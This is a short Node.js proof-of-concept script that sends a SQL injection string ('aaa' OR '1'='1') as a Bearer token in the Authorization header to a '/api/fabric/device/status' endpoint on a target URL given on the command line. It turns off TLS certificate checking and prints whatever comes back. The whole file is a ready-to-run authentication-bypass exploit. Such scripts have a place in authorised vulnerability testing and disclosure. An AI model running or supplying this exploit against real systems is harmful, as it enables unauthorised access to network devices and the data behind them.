const axios = require('axios');

async function testSQLi(baseUrl) {
    const url = `${baseUrl}/api/fabric/device/status`;
    try {
        const response = await axios.get(url, {
            headers: {
                'Authorization': "Bearer aaa' OR '1'='1"
            },
            httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false }),
            timeout: 10000
        });
        console.log(`Status code: ${response.status}`);
        console.log("Response body:");
        console.log(response.data);
    } catch (err) {
        console.error(`Error: ${err.message}`);
    }
}

if (require.main === module) {
    const baseUrl = process.argv[2];
    if (!baseUrl) {
        console.error("Usage: node poc.js <base_url>");
        process.exit(1);
    }
    testSQLi(baseUrl);
}
